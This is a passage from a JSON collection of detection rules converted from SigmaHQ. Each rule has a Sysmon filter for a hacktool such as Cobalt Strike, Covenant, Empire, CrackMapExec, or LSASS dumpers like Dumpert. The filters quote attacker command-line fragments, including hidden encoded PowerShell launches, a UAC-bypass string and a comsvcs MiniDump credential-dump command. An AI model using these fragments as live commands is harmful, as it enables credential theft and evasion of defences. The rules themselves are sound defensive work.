Cobalt Strike with StartW function to load DLLs from the command line.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE' || evt.Parsed.CommandLine contains 'rundll32.exe' || evt.Parsed.CommandLine contains 'rundll32 ') && evt.Parsed.CommandLine contains '.dll' && (evt.Parsed.CommandLine endsWith ' StartW' || evt.Parsed.CommandLine endsWith ',StartW'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"CobaltStrike Load by Rundll32\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml", "version": "0.2", "versions": {"0.1": {"digest": "ebf0b2c2233d5be8a856ee5e4a042c3ab549793a1b874d31abd723d931fca743"}, "0.2": {"digest": "ed4081eaefe0c8367a20102ba4964d59ad56311f2b4437eea9703c7c23ca71e4"}}}, "sigmahq/proc_creation_win_hktl_cobaltstrike_process_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_cobaltstrike_process_patterns\ndescription: |\n  Detects potential process patterns related to Cobalt Strike beacon activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine endsWith 'cmd.exe /C whoami' && evt.Parsed.ParentImage startsWith 'C:\\\\Temp\\\\' || (evt.Parsed.ParentImage endsWith '\\\\runonce.exe' || evt.Parsed.ParentImage endsWith '\\\\dllhost.exe') && evt.Parsed.CommandLine contains 'cmd.exe /c echo' && evt.Parsed.CommandLine contains '> \\\\\\\\.\\\\pipe' || evt.Parsed.ParentCommandLine contains 'cmd.exe /C echo' && evt.Parsed.ParentCommandLine contains ' > \\\\\\\\.\\\\pipe' && evt.Parsed.CommandLine endsWith 'conhost.exe 0xffffffff -ForceV1' || evt.Parsed.ParentCommandLine endsWith '/C whoami' && evt.Parsed.CommandLine endsWith 'conhost.exe 0xffffffff -ForceV1')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Potential CobaltStrike Process Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential process patterns related to Cobalt Strike beacon activity\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_cobaltstrike_process_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "8503c08e46ee059ecedbd3742cd55ba43d80ed717d58456a02bb135fc79cc705"}, "0.2": {"digest": "abee02b91bbc0e634feb7b28eb1fa69a40e392bccd9b02180503fc2548ab5137"}}}, "sigmahq/proc_creation_win_hktl_covenant": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_covenant\ndescription: |\n  Detects suspicious command lines used in Covenant luanchers\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '-Sta' && evt.Parsed.CommandLine contains '-Nop' && evt.Parsed.CommandLine contains '-Window' && evt.Parsed.CommandLine contains 'Hidden' && (evt.Parsed.CommandLine contains '-Command' || evt.Parsed.CommandLine contains '-EncodedCommand') || evt.Parsed.CommandLine contains 'sv o (New-Object IO.MemorySteam);sv d ' || evt.Parsed.CommandLine contains 'mshta file.hta' || evt.Parsed.CommandLine contains 'GruntHTTP' || evt.Parsed.CommandLine contains '-EncodedCommand cwB2ACAAbwAgA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1564.003\n\n  label: \"HackTool - Covenant PowerShell Launcher\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious command lines used in Covenant luanchers\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_covenant.yml", "version": "0.2", "versions": {"0.1": {"digest": "de6ab0883fdd6f9a084170d31357c4eb9251d9bbe79f2324eef11176a5b1382b"}, "0.2": {"digest": "3deaaf510039060479af9aa0d8a0375a3c4169b753b88453f68f2aa85f5bb410"}}}, "sigmahq/proc_creation_win_hktl_crackmapexec_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_crackmapexec_execution\ndescription: |\n  This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\crackmapexec.exe' || evt.Parsed.CommandLine contains ' -M pe_inject ' || evt.Parsed.CommandLine contains ' --local-auth' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -x ' || evt.Parsed.CommandLine contains ' --local-auth' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -p ' && evt.Parsed.CommandLine contains ' -H \\'NTHASH\\'' || evt.Parsed.CommandLine contains ' mssql ' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -p ' && evt.Parsed.CommandLine contains ' -M ' && evt.Parsed.CommandLine contains ' -d ' || evt.Parsed.CommandLine contains ' smb ' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -H ' && evt.Parsed.CommandLine contains ' -M ' && evt.Parsed.CommandLine contains ' -o ' || evt.Parsed.CommandLine contains ' smb ' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -p ' && evt.Parsed.CommandLine contains ' --local-auth' || evt.Parsed.CommandLine contains ' --local-auth' && evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -p ' && evt.Parsed.CommandLine contains ' 10.' && evt.Parsed.CommandLine contains ' 192.168.' && evt.Parsed.CommandLine contains '/24 ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1053\n   - attack.t1059.003\n   - attack.t1059.001\n   - attack.t1110\n   - attack.t1201\n\n  label: \"HackTool - CrackMapExec Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_crackmapexec_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "8eb010227bd3ad71494031ec6b4b9c037f91368f1ee7b7709b009989ff2bc926"}, "0.2": {"digest": "9944e21533715beadaabb71aaea1f8cfe35907d8d0742616853c4310e91570d2"}}}, "sigmahq/proc_creation_win_hktl_crackmapexec_execution_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_crackmapexec_execution_patterns\ndescription: |\n  Detects various execution patterns of the CrackMapExec pentesting framework\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (Match('cmd.exe /Q /c  1> \\\\\\\\\\\\\\\\ 2>&1', evt.Parsed.CommandLine) || Match('cmd.exe /C  > \\\\\\\\\\\\\\\\ 2>&1', evt.Parsed.CommandLine) || Match('cmd.exe /C  > \\\\Temp\\\\ 2>&1', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains 'powershell.exe -exec bypass -noni -nop -w 1 -C \"' || evt.Parsed.CommandLine contains 'powershell.exe -noni -nop -w 1 -enc ')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1053\n   - attack.t1059.003\n   - attack.t1059.001\n\n  label: \"HackTool - CrackMapExec Execution Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects various execution patterns of the CrackMapExec pentesting framework\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_crackmapexec_execution_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "631ea0d5497cfb0b52f6a626edfd9025c61299e609926c79ac47c409b1497d6f"}, "0.2": {"digest": "8510d7cf56e2507aa2b724f2b536e557f2630d845dd15b1867e6202032606422"}}}, "sigmahq/proc_creation_win_hktl_crackmapexec_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_crackmapexec_patterns\ndescription: |\n  Detects suspicious process patterns found in logs when CrackMapExec is used\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'tasklist /fi ' && evt.Parsed.CommandLine contains 'Imagename eq lsass.exe' && (evt.Parsed.CommandLine contains 'cmd.exe /c ' || evt.Parsed.CommandLine contains 'cmd.exe /r ' || evt.Parsed.CommandLine contains 'cmd.exe /k ' || evt.Parsed.CommandLine contains 'cmd /c ' || evt.Parsed.CommandLine contains 'cmd /r ' || evt.Parsed.CommandLine contains 'cmd /k ') && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') || evt.Parsed.CommandLine contains 'do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump' && evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\' && evt.Parsed.CommandLine contains ' full' && evt.Parsed.CommandLine contains '%%B' || evt.Parsed.CommandLine contains 'tasklist /v /fo csv' && evt.Parsed.CommandLine contains 'findstr /i \"lsass\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - CrackMapExec Process Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious process patterns found in logs when CrackMapExec is used\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_crackmapexec_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "f5b21b1f8e2bc2279129d7bda5f2a8426804d043675b36d97b5c459064a3996d"}, "0.2": {"digest": "e67dc163b0c7d389536bced79cb6e5a917fcf439017abfcd33ec0e3fc1cea983"}}}, "sigmahq/proc_creation_win_hktl_crackmapexec_powershell_obfuscation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_crackmapexec_powershell_obfuscation\ndescription: |\n  The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (Match('joinsplit', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains '( $ShellId[1]+$ShellId[13]+\\'x\\')' || Match('( $PSHome[]+$PSHOME[]+', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains '( $env:Public[13]+$env:Public[5]+\\'x\\')' || Match('( $env:ComSpec[4,,25]-Join\\'\\')', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains '[1,3]+\\'x\\'-Join\\'\\')'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027.005\n\n  label: \"HackTool - CrackMapExec PowerShell Obfuscation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_crackmapexec_powershell_obfuscation.yml", "version": "0.2", "versions": {"0.1": {"digest": "119e8ce6c6e61fed34c7be1909ad545581aee085b037b7210db83b0e1c71fd8e"}, "0.2": {"digest": "a138491b7bd718eb156e2cbd0549d02d63f58548cbe58329b48747c0a87ed539"}}}, "sigmahq/proc_creation_win_hktl_createminidump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_createminidump\ndescription: |\n  Detects the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\CreateMiniDump.exe' || evt.Parsed.Imphash == '4a07f944a83e8a7c2525efa35dd30e2f' || evt.Parsed.Hashes contains 'IMPHASH=4a07f944a83e8a7c2525efa35dd30e2f')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - CreateMiniDump Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_createminidump.yml", "version": "0.2", "versions": {"0.1": {"digest": "dbd275bc4fc6c3e68d6854195a99b93ac33bf07ab86da009e9f19338d6690f93"}, "0.2": {"digest": "0f8edf6748d21fdb400402f015524fdc693206f79ecca3e56ea22177924b89e4"}}}, "sigmahq/proc_creation_win_hktl_dinjector": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_dinjector\ndescription: |\n  Detects the use of the Dinject PowerShell cradle based on the specific flags\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' /am51' && evt.Parsed.CommandLine contains ' /password')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055\n\n  label: \"HackTool - DInjector PowerShell Cradle Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the Dinject PowerShell cradle based on the specific flags\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_dinjector.yml", "version": "0.2", "versions": {"0.1": {"digest": "babadd20840d3bcd055cbd4559b13c7cf929cdc30ebd83e6b948d63bfa222ca7"}, "0.2": {"digest": "1b7c178869383e1ba63e49d0b3d48325484fa5b84ce5f73cbdfd676b4446de0f"}}}, "sigmahq/proc_creation_win_hktl_dumpert": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_dumpert\ndescription: |\n  Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Hashes contains '09D278F9DE118EF09163C6140255C690' || evt.Parsed.CommandLine contains 'Dumpert.dll')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - Dumpert Process Dumper Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_dumpert.yml", "version": "0.2", "versions": {"0.1": {"digest": "5849a38ea2d7a3bd5a135868626587500640a19a958f96f6c8e87470c9f53721"}, "0.2": {"digest": "0774b5ed7b12da8b91d3309bd374dc96adb06db42fce7c4fc4d1815c8ccb6a8d"}}}, "sigmahq/proc_creation_win_hktl_edrsilencer": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_edrsilencer\ndescription: |\n  Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\EDRSilencer.exe' || evt.Parsed.OriginalFileName == 'EDRSilencer.exe' || evt.Parsed.Description contains 'EDRSilencer')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562\n\n  label: \"HackTool - EDRSilencer Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information. \n", "path": "scenarios/sigmahq/proc_creation_win_hktl_edrsilencer.yml", "version": "0.2", "versions": {"0.1": {"digest": "a5c67100ea2ebfbe31a8b843b7322aa5a62c2dbf18692ca63c02ff34aa034f56"}, "0.2": {"digest": "00d2a1b7fbdffb0067d4a39f052517a14b06cddcd8b7547bcd252b4c0d5160bb"}}}, "sigmahq/proc_creation_win_hktl_empire_powershell_launch": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_empire_powershell_launch\ndescription: |\n  Detects suspicious powershell command line parameters used in Empire\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' -NoP -sta -NonI -W Hidden -Enc ' || evt.Parsed.CommandLine contains ' -noP -sta -w 1 -enc ' || evt.Parsed.CommandLine contains ' -NoP -NonI -W Hidden -enc ' || evt.Parsed.CommandLine contains ' -noP -sta -w 1 -enc' || evt.Parsed.CommandLine contains ' -enc  SQB' || evt.Parsed.CommandLine contains ' -nop -exec bypass -EncodedCommand ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"HackTool - Empire PowerShell Launch Parameters\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious powershell command line parameters used in Empire\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_empire_powershell_launch.yml", "version": "0.2", "versions": {"0.1": {"digest": "33a0c3882555e8c8b02810a74b06710c9602cb0b34f277193bc212cb8b65a979"}, "0.2": {"digest": "def6cbad69d9f23945b43bcba473f29e8c2660374c5a009b9d394926dfc90dfb"}}}, "sigmahq/proc_creation_win_hktl_empire_powershell_uac_bypass": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_empire_powershell_uac_bypass\ndescription: |\n  Detects some Empire PowerShell UAC bypass methods\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)' || evt.Parsed.CommandLine contains ' -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"HackTool - Empire PowerShell UAC Bypass\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects some Empire PowerShell UAC bypass methods\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_empire_powershell_uac_bypass.yml", "version": "0.2", "versions": {"0.1": {"digest": "24fc48aedf4d715f66b40c1ecdc4664d1bd621643d58615f3cbc70f750a70ad9"}, "0.2": {"digest": "4bbf88efc78bc946e523872f257ae26facbd607b859efd5b4e999367705e355c"}}}, "sigmahq/proc_creation_win_hktl_execution_via_imphashes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_execution_via_imphashes\ndescription: |\n  Detects the execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Imphash in ['bcca3c247b619dcd13c8cdff5f123932', '3a19059bd7688cb88e70005f18efc439', 'bf6223a49e45d99094406777eb6004ba', '23867a89c2b8fc733be6cf5ef902f2d1', 'a37ff327f8d48e8a4d2f757e1b6e70bc', 'f9a28c458284584a93b14216308d31bd', '6118619783fc175bc7ebecff0769b46e', '959a83047e80ab68b368fdb3f4c6e4ea', '563233bfa169acc7892451f71ad5850a', '87575cb7a0e0700eb37f2e3668671a08', '13f08707f759af6003837a150a371ba1', '1781f06048a7e58b323f0b9259be798b', '233f85f2d4bc9d6521a6caae11a1e7f5', '24af2584cbf4d60bbe5c6d1b31b3be6d', '632969ddf6dbf4e0f53424b75e4b91f2', '713c29b396b907ed71a72482759ed757', '749a7bb1f0b4c4455949c0b2bf7f9e9f', '8628b2608957a6b0c6330ac3de28ce2e', '8b114550386e31895dfab371e741123d', '94cb940a1a6b65bed4d5a8f849ce9793', '9d68781980370e00e0bd939ee5e6c141', 'b18a1401ff8f444056d29450fbc0a6ce', 'cb567f9498452721d77a451374955f5f', '730073214094cd328547bf1f72289752', '17b461a082950fc6332228572138b80c', 'dc25ee78e2ef4d36faa0badf1e7461c9', '819b19d53ca6736448f9325a85736792', '829da329ce140d873b4a8bde2cbfaa7e', 'c547f2e66061a8dffb6f5a3ff63c0a74', '0588081ab0e63ba785938467e1b10cca', '0d9ec08bac6c07d9987dfd0f1506587c', 'bc129092b71c89b4d4c8cdf8ea590b29', '4da924cf622d039d58bce71cdf05d242', 'e7a3a5c377e2d29324093377d7db1c66', '9a9dbec5c62f0380b4fa5fd31deffedf', 'af8a3976ad71e5d5fdfb67ddb8dadfce', '0c477898bbf137bbd6f2a54e3b805ff4', '0ca9f02b537bcea20d4ea5eb1a9fe338', '3ab3655e5a14d4eefc547f4781bf7f9e', 'e6f9d5152da699934b30daab206471f6', '3ad59991ccf1d67339b319b15a41b35d', 'ffdd59e0318b85a3e480874d9796d872', '0cf479628d7cc1ea25ec7998a92f5051', '07a2d4dcbd6cb2c6a45e6b101f0b6d51', 'd6d0f80386e1380d05cb78e871bc72b1', '38d9e015591bbfd4929e0d0f47fa0055', '0e2216679ca6e1094d63322e3412d650', 'ada161bf41b8e5e9132858cb54cab5fb', '2a1bc4913cd5ecb0434df07cb675b798', '11083e75553baae21dc89ce8f9a195e4', 'a23d29c9e566f2fa8ffbb79267f5df80', '4a07f944a83e8a7c2525efa35dd30e2f', '767637c23bb42cd5d7397cf58b0be688', '14c4e4c72ba075e9069ee67f39188ad8', '3c782813d4afce07bbfc5a9772acdbdc', '7d010c6bb6a3726f327f7e239166d127', '89159ba4dd04e4ce5559f132a9964eb3', '6f33f4a5fc42b8cec7314947bd13f30f', '5834ed4291bdeb928270428ebbaf7604', '5a8a8a43f25485e7ee1b201edcbc7a38', 'dc7d30b90b2d8abf664fbed2b1b59894', '41923ea1f824fe63ea5beb84db7a3e74', '3de09703c8e79ed2ca3f01074719906b', 'a53a02b997935fd8eedcb5f7abab9b9f', 'e96a73c7bf33a464c510ede582318bf2', '32089b8851bbf8bc2d014e9f37288c83', '09D278F9DE118EF09163C6140255C690', '03866661686829d806989e2fc5a72606', 'e57401fbdadcd4571ff385ab82bd5d6d', '84B763C45C0E4A3E7CA5548C710DB4EE', '19584675d94829987952432e018d5056', '330768a4f172e10acb6287b87289d83b', '885c99ccfbe77d1cbfcb9c4e7c1a3313', '22a22bc9e4e0d2f189f1ea01748816ac', '7fa30e6bb7e8e8a69155636e50bf1b28', '96df3a3731912449521f6f8d183279b1', '7e6cf3ff4576581271ac8a313b2aab46', '51791678f351c03a0eb4e2a7b05c6e17', '25ce42b079282632708fc846129e98a5', '021bcca20ba3381b11bdde26b4e62f20', '59223b5f52d8799d38e0754855cbdf42', '81e75d8f1d276c156653d3d8813e4a43', '17244e8b6b8227e57fe709ccad421420', '5b76da3acdedc8a5cdf23a798b5936b4', 'cb2b65bb77d995cc1c0e5df1c860133c', '40445337761d80cf465136fafb1f63e6', '8a790f401b29fa87bc1e56f7272b3aa6', 'b50199e952c875241b9ce06c971ce3c1'] || evt.Parsed.Hashes contains 'IMPHASH=BCCA3C247B619DCD13C8CDFF5F123932' || evt.Parsed.Hashes contains 'IMPHASH=3A19059BD7688CB88E70005F18EFC439' || evt.Parsed.Hashes contains 'IMPHASH=bf6223a49e45d99094406777eb6004ba' || evt.Parsed.Hashes contains 'IMPHASH=23867A89C2B8FC733BE6CF5EF902F2D1' || evt.Parsed.Hashes contains 'IMPHASH=A37FF327F8D48E8A4D2F757E1B6E70BC' || evt.Parsed.Hashes contains 'IMPHASH=F9A28C458284584A93B14216308D31BD' || evt.Parsed.Hashes contains 'IMPHASH=6118619783FC175BC7EBECFF0769B46E' || evt.Parsed.Hashes contains 'IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA' || evt.Parsed.Hashes contains 'IMPHASH=563233BFA169ACC7892451F71AD5850A' || evt.Parsed.Hashes contains 'IMPHASH=87575CB7A0E0700EB37F2E3668671A08' || evt.Parsed.Hashes contains 'IMPHASH=13F08707F759AF6003837A150A371BA1' || evt.Parsed.Hashes contains 'IMPHASH=1781F06048A7E58B323F0B9259BE798B' || evt.Parsed.Hashes contains 'IMPHASH=233F85F2D4BC9D6521A6CAAE11A1E7F5' || evt.Parsed.Hashes contains 'IMPHASH=24AF2584CBF4D60BBE5C6D1B31B3BE6D' || evt.Parsed.Hashes contains 'IMPHASH=632969DDF6DBF4E0F53424B75E4B91F2' || evt.Parsed.Hashes contains 'IMPHASH=713C29B396B907ED71A72482759ED757' || evt.Parsed.Hashes contains 'IMPHASH=749A7BB1F0B4C4455949C0B2BF7F9E9F' || evt.Parsed.Hashes contains 'IMPHASH=8628B2608957A6B0C6330AC3DE28CE2E' || evt.Parsed.Hashes contains 'IMPHASH=8B114550386E31895DFAB371E741123D' || evt.Parsed.Hashes contains 'IMPHASH=94CB940A1A6B65BED4D5A8F849CE9793' || evt.Parsed.Hashes contains 'IMPHASH=9D68781980370E00E0BD939EE5E6C141' || evt.Parsed.Hashes contains 'IMPHASH=B18A1401FF8F444056D29450FBC0A6CE' || evt.Parsed.Hashes contains 'IMPHASH=CB567F9498452721D77A451374955F5F' || evt.Parsed.Hashes contains 'IMPHASH=730073214094CD328547BF1F72289752' || evt.Parsed.Hashes contains 'IMPHASH=17B461A082950FC6332228572138B80C' || evt.Parsed.Hashes contains 'IMPHASH=DC25EE78E2EF4D36FAA0BADF1E7461C9' || evt.Parsed.Hashes contains 'IMPHASH=819B19D53CA6736448F9325A85736792' || evt.Parsed.Hashes contains 'IMPHASH=829DA329CE140D873B4A8BDE2CBFAA7E' || evt.Parsed.Hashes contains 'IMPHASH=C547F2E66061A8DFFB6F5A3FF63C0A74' || evt.Parsed.Hashes contains 'IMPHASH=0588081AB0E63BA785938467E1B10CCA' || evt.Parsed.Hashes contains 'IMPHASH=0D9EC08BAC6C07D9987DFD0F1506587C' || evt.Parsed.Hashes contains 'IMPHASH=BC129092B71C89B4D4C8CDF8EA590B29' || evt.Parsed.Hashes contains 'IMPHASH=4DA924CF622D039D58BCE71CDF05D242' || evt.Parsed.Hashes contains 'IMPHASH=E7A3A5C377E2D29324093377D7DB1C66' || evt.Parsed.Hashes contains 'IMPHASH=9A9DBEC5C62F0380B4FA5FD31DEFFEDF' || evt.Parsed.Hashes contains 'IMPHASH=AF8A3976AD71E5D5FDFB67DDB8DADFCE' || evt.Parsed.Hashes contains 'IMPHASH=0C477898BBF137BBD6F2A54E3B805FF4' || evt.Parsed.Hashes contains 'IMPHASH=0CA9F02B537BCEA20D4EA5EB1A9FE338' || evt.Parsed.Hashes contains 'IMPHASH=3AB3655E5A14D4EEFC547F4781BF7F9E' || evt.Parsed.Hashes contains 'IMPHASH=E6F9D5152DA699934B30DAAB206471F6' || evt.Parsed.Hashes contains 'IMPHASH=3AD59991CCF1D67339B319B15A41B35D' || evt.Parsed.Hashes contains 'IMPHASH=FFDD59E0318B85A3E480874D9796D872' || evt.Parsed.Hashes contains 'IMPHASH=0CF479628D7CC1EA25EC7998A92F5051' || evt.Parsed.Hashes contains 'IMPHASH=07A2D4DCBD6CB2C6A45E6B101F0B6D51' || evt.Parsed.Hashes contains 'IMPHASH=D6D0F80386E1380D05CB78E871BC72B1' || evt.Parsed.Hashes contains 'IMPHASH=38D9E015591BBFD4929E0D0F47FA0055' || evt.Parsed.Hashes contains 'IMPHASH=0E2216679CA6E1094D63322E3412D650' || evt.Parsed.Hashes contains 'IMPHASH=ADA161BF41B8E5E9132858CB54CAB5FB' || evt.Parsed.Hashes contains 'IMPHASH=2A1BC4913CD5ECB0434DF07CB675B798' || evt.Parsed.Hashes contains 'IMPHASH=11083E75553BAAE21DC89CE8F9A195E4' || evt.Parsed.Hashes contains 'IMPHASH=A23D29C9E566F2FA8FFBB79267F5DF80' || evt.Parsed.Hashes contains 'IMPHASH=4A07F944A83E8A7C2525EFA35DD30E2F' || evt.Parsed.Hashes contains 'IMPHASH=767637C23BB42CD5D7397CF58B0BE688' || evt.Parsed.Hashes contains 'IMPHASH=14C4E4C72BA075E9069EE67F39188AD8' || evt.Parsed.Hashes contains 'IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC' || evt.Parsed.Hashes contains 'IMPHASH=7D010C6BB6A3726F327F7E239166D127' || evt.Parsed.Hashes contains 'IMPHASH=89159BA4DD04E4CE5559F132A9964EB3' || evt.Parsed.Hashes contains 'IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F' || evt.Parsed.Hashes contains 